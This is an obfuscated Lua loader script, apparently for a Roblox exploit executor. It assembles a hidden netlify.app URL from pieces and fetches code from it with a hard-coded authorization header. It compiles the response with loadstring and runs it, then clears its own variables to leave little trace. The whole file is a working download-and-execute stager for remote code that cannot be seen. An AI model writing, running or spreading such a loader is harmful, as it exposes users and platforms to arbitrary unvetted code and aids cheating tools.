local function v10293847561920384756()
    local p = { "https://shadowxprotection", ".netlify.app", "/api/loader" }
    local r = table.concat(p)
    p = nil
    return r
end

local v29384756102938475610 = (syn and syn.request) or (http and http.request) or (typeof(request) == "function" and request)

local v_authToken = '@#$_&-+()/*"' .. "':;!?_1029384756"

local function v84756102938475610293(url)
    assert(v29384756102938475610, "No request function available")
    local ok, res = pcall(v29384756102938475610, {
        Url     = url,
        Method  = "GET",
        Headers = {
            ["Authorization"] = v_authToken,
            ["Content-Type"]  = "application/json",
        },
    })
    assert(ok and res and res.Body and res.Body ~= "", "Fetch failed")
    return res.Body
end

local v_url  = v10293847561920384756()
local v_body = v84756102938475610293(v_url)
v_url        = nil

local v_fn, v_err = loadstring(v_body)
v_body = nil

assert(v_fn, "Compile error: " .. tostring(v_err))

local v_ok, v_rerr = pcall(v_fn)
v_fn = nil
v_authToken = nil

assert(v_ok, "Runtime error: " .. tostring(v_rerr))
